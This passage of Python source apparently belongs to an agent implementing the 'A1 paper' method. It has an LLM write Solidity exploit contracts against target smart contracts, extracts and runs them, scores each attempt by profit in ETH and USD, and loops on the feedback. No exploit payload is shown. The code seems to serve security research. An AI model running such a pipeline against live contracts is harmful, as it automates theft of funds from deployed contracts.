            # Log tool call results
            if tool_calls:
                successful_tools = [tc for tc in tool_calls if tc.result and tc.result.success]
                failed_tools = [tc for tc in tool_calls if not tc.result or not tc.result.success]
                
                self.logger.info(f"🔧 Tool usage: {len(successful_tools)} successful, {len(failed_tools)} failed")
                
                for tc in successful_tools:
                    self.logger.info(f"✅ {tc.name}: {tc.result.data.get('provider', 'N/A')} - {tc.execution_time:.2f}s")
                
                for tc in failed_tools:
                    error_msg = tc.error or (tc.result.error_message if tc.result else "Unknown error")
                    self.logger.warning(f"❌ {tc.name}: {error_msg}")
            
            # Extract Solidity code from response
            exploit_code = self._extract_solidity_code(response)
            self.total_cost += tool_cost
            
            if exploit_code:
                self.logger.info(f"✅ Exploit code extracted: {len(exploit_code)} characters")
                self.logger.debug(f"Exploit code preview:\n{exploit_code[:500]}...")
            else:
                self.logger.warning("⚠️ No valid exploit code found in LLM response")
            
            # TODO: Extract and store reasoning from response for iteration analysis
            
            return exploit_code
            
        except Exception as e:
            self.logger.error(f"❌ Error generating exploit with tools: {str(e)}")
            # Fallback to standard generation
            try:
                self.logger.info("🔄 Falling back to standard LLM generation...")
                response = await self.llm_client.generate(
                    system_prompt=system_prompt,
                    user_prompt=user_prompt,
                    temperature=self.config.temperature + (iteration * 0.1),
                    max_tokens=self.config.max_tokens
                )
                
                exploit_code = self._extract_solidity_code(response)
                self.total_cost += self.llm_client.get_last_request_cost()
                return exploit_code
                
            except Exception as fallback_e:
                self.logger.error(f"❌ Fallback generation also failed: {str(fallback_e)}")
                return None
    
    def _extract_solidity_code(self, response: str) -> Optional[str]:
        """Extract Solidity code from LLM response with improved robustness"""
        
        # Primary: Look for ```solidity code blocks (proper handling of language identifier)
        pattern = r'```solidity\n(.*?)\n```'
        matches = re.findall(pattern, response, re.DOTALL)
        
        if matches:
            code = matches[0].strip()
            # Validate it's a complete contract
            if self._is_complete_contract(code):
                return code
        
        # Secondary: Look for ```solidity with optional whitespace
        pattern = r'```solidity\s*\n?(.*?)\n?\s*```'
        matches = re.findall(pattern, response, re.DOTALL)
        
        if matches:
            code = matches[0].strip()
            if self._is_complete_contract(code):
                return code
        
        # Tertiary: Look for any code block that contains contract
        pattern = r'```[^\n]*\n(.*?)\n```'
        matches = re.findall(pattern, response, re.DOTALL)
        
        for match in matches:
            code = match.strip()
            if "contract" in code and self._is_complete_contract(code):
                return code
        
        # Quaternary: Extract contract blocks without code fences
        pattern = r'contract\s+\w+\s*\{.*?\}'
        matches = re.findall(pattern, response, re.DOTALL)
        
        for match in matches:
            if self._is_complete_contract(match):
                return match
        
        # Final fallback: Look for anything that looks like a contract
        pattern = r'(contract\s+\w+[^{]*\{(?:[^{}]*\{[^{}]*\})*[^{}]*\})'
        matches = re.findall(pattern, response, re.DOTALL)
        
        for match in matches:
            code = match.strip()
            if self._is_complete_contract(code):
                return code
        
        self.logger.warning("❌ No complete contract found in LLM response")
        return None
    
    def _is_complete_contract(self, code: str) -> bool:
        """Check if code is a complete contract with exploit function"""
        if not code or "contract" not in code:
            return False
        
        # Must have contract declaration and exploit function
        has_contract = re.search(r'contract\s+\w+', code)
        has_exploit = "function exploit()" in code or "function exploit() external" in code
        
        # Check for balanced braces
        brace_count = code.count('{') - code.count('}')
        
        return bool(has_contract and has_exploit and brace_count == 0)
    
    async def _normalize_revenue(self, execution_result: ToolResult, context: ContractContext) -> ToolResult:
        """A1 paper-compliant revenue normalization using RevenueNormalizerTool"""
        
        self.logger.info("💰 Starting A1 paper-compliant revenue normalization")
        
        try:
            # Use RevenueNormalizerTool for proper balance reconciliation methodology
            revenue_result = await self.tools["revenue_tool"].execute({
                "execution_result": execution_result,
                "chain_id": context.chain_id,
                "exploit_contract_address": execution_result.data.get("exploit_contract_address", ""),
                "target_contract_address": context.contract_address,
                "block_number": context.block_number
            })
            
            if revenue_result.success:
                self.logger.info("✅ Revenue normalization completed successfully using A1 paper methodology")
                
                # Map revenue tool results to expected format
                revenue_data = revenue_result.data
                return ToolResult(
                    success=True,
                    data={
                        "total_value_eth": revenue_data.get("revenue_base_currency", 0.0),
                        "total_value_usd": revenue_data.get("revenue_usd", 0.0),
                        "is_profitable": revenue_data.get("is_profitable", False),
                        "items_detected": len(revenue_data.get("balance_reconciliation", {}).get("balance_changes", [])),
                        "detection_scope": "revenue_normalizer_tool",
                        "value_items": revenue_data.get("balance_reconciliation", {}).get("balance_changes", []),
                        "balance_reconciliation": revenue_data.get("balance_reconciliation", {}),
                        "compliance": revenue_data.get("compliance", {}),
                        "market_data": revenue_data.get("market_data", {}),
                        "base_currency": revenue_data.get("base_currency", "ETH"),
                        "methodology": "A1_paper_section_IV_D"
                    },
                    tool_name="revenue_normalizer_tool"
                )
            else:
                self.logger.warning(f"⚠️ Revenue normalization failed: {revenue_result.error_message}")
                
        except Exception as e:
            self.logger.error(f"❌ Revenue normalization error: {str(e)}")
        
        # Fallback to value detector for compatibility
        self.logger.info("🔄 Falling back to value detector for revenue calculation")
        
        # Extract exploit contract address from execution result
        exploit_contract = execution_result.data.get("exploit_contract_address")
        
        # If no exploit contract found in logs, try value detection anyway for token analysis
        if not exploit_contract:
            self.logger.warning(f"No exploit contract address found in execution logs - attempting value detection on target contract. Available keys: {list(execution_result.data.keys())}")
            
            # Still try comprehensive value detection on the target contract itself
            # This can detect minted tokens, state changes, etc.
            try:
                value_result = await self.tools["value_detector"].execute({
                    "contract_address": context.contract_address,
                    "exploit_contract": None,  # Will analyze target contract instead
                    "chain_id": context.chain_id,
                    "block_number": context.block_number,
                    "detection_scope": "target_contract_analysis",
                    "execution_result": execution_result
                })
                
                if value_result.success:
                    self.logger.info(f"🔍 Target contract value detection completed successfully")
                    return value_result
                else:
                    self.logger.warning(f"🔍 Target contract value detection failed: {value_result.error_message}")
            except Exception as e:
                self.logger.error(f"🔍 Value detection failed with error: {str(e)}")
            
            # Fallback to execution tool results if value detection fails
            eth_gained = execution_result.data.get("eth_gained", 0.0)
            is_profitable = execution_result.data.get("profitable", False)
            
            return ToolResult(
                success=True,
                data={
                    "total_value_eth": eth_gained,
                    "total_value_usd": eth_gained * 3200.0,  # Approximate USD conversion
                    "is_profitable": is_profitable,
                    "items_detected": 1 if eth_gained > 0 else 0,
                    "detection_scope": "execution_tool_fallback",
                    "value_items": [{
                        "asset_type": "execution_result",
                        "amount": eth_gained,
                        "estimated_value_eth": eth_gained,
                        "estimated_value_usd": eth_gained * 3200.0,
                        "confidence": 1.0,
                        "detection_method": "foundry_execution"
                    }] if eth_gained > 0 else [],
                    "fallback_reason": "exploit_contract_address_not_found"
                },
                tool_name="value_detector_fallback"
            )
        
        self.logger.info(f"🔍 Running comprehensive value detection on exploit contract: {exploit_contract}")
        
        return await self.tools["value_detector"].execute({
            "contract_address": context.contract_address,
            "exploit_contract": exploit_contract,
            "chain_id": context.chain_id,
            "block_number": context.block_number,
            "detection_scope": "comprehensive",
            "execution_result": execution_result
        })
    
    def _format_feedback(self, execution_result: ToolResult) -> str:
        """Format execution feedback for next iteration"""
        if execution_result.success:
            if execution_result.data.get("profitable"):
                return f"SUCCESS: Exploit profitable. Revenue: {execution_result.data.get('revenue', 0)} ETH"
            else:
                return f"EXECUTED: Exploit compiled and ran but not profitable. Gas used: {execution_result.data.get('gas_used', 0)}"
        else:
            return f"FAILED: {execution_result.error_message}"
    
    def _classify_vulnerability(self, exploit_code: str) -> str:
        """Basic vulnerability classification"""
        code_lower = exploit_code.lower()
        
        if "reentrancy" in code_lower or "call{value:" in code_lower:
            return "reentrancy"
        elif "flashloan" in code_lower:
            return "flash_loan_attack"
        elif "owner" in code_lower and "onlyowner" in code_lower:
            return "access_control"
        elif "price" in code_lower and "oracle" in code_lower:
            return "price_manipulation"
        else:
            return "unknown"
    
    def _summarize_exploit_strategy(self, exploit_code: str) -> str:
        """Generate a brief summary of the exploit strategy from the code"""
        if not exploit_code:
            return "No exploit code generated"
        
        code_lower = exploit_code.lower()
        
        # Look for key patterns to identify strategy
        if "mint" in code_lower:
            return "Token minting exploit"
        elif "flashloan" in code_lower or "flashLoan" in exploit_code:
            return "Flash loan attack"
        elif "transfer" in code_lower and "balanceof" in code_lower:
            return "Token extraction exploit"
        elif "stake" in code_lower or "claim" in code_lower:
            return "Staking/reward manipulation"
        elif "signature" in code_lower or "empty" in code_lower:
            return "Signature verification bypass"
        elif "onlyowner" in code_lower or "owner" in code_lower:
            return "Access control bypass"
        else:
            # Extract the first meaningful function call
            import re
            calls = re.findall(r'\.call\([^)]*"([^"]+)"', exploit_code)
            if calls:
                return f"Function call exploit: {calls[0]}"
            return "Generic smart contract exploit"
    
    def _generate_lessons_learned(self, execution_result, exploit_executed: bool, is_profitable: bool) -> str:
        """Generate lessons learned from this iteration's results"""
        if exploit_executed and is_profitable:
            return "SUCCESS: Found profitable exploit - technique works"
        elif exploit_executed and not is_profitable:
            return "Exploit executed but not profitable - need to check economic viability or contract balance"
        elif not execution_result.success:
            error = execution_result.error_message or "Unknown error"
            if "compilation" in error.lower():
                return "Compilation failed - check function signatures and syntax"
            elif "revert" in error.lower():
                return "Transaction reverted - exploit attempt was blocked by contract logic"
            elif "insufficient" in error.lower():
                return "Insufficient funds/tokens - exploit may need different setup or more capital"
            else:
                return f"Execution failed: {error}"
        else:
            return "Exploit failed to execute properly - unknown issue"
    
    async def _get_latest_block(self, chain_id: int) -> int:
        """
        Get latest block number for chain using Web3
        """
        try:
            latest_block = await self.web3_client.get_latest_block(chain_id)
            if latest_block:
                return latest_block
            else:
                # Fallback to reasonable defaults if Web3 fails
                if chain_id == 1:  # Ethereum
                    return 21000000
                elif chain_id == 56:  # BSC
                    return 45000000
                else:
                    return 1000000
        except Exception as e:
            self.logger.warning(f"Failed to get latest block for chain {chain_id}: {str(e)}")
            # Return fallback defaults
            if chain_id == 1:
                return 21000000
            elif chain_id == 56:
                return 45000000
            else:
                return 1000000
    
    def get_cost_summary(self) -> Dict[str, float]:
        """Get cost summary for analysis"""
        return {
            "total_cost": self.total_cost,
            "llm_cost": self.llm_client.total_cost,
            "tool_cost": self.total_cost - self.llm_client.total_cost
        } 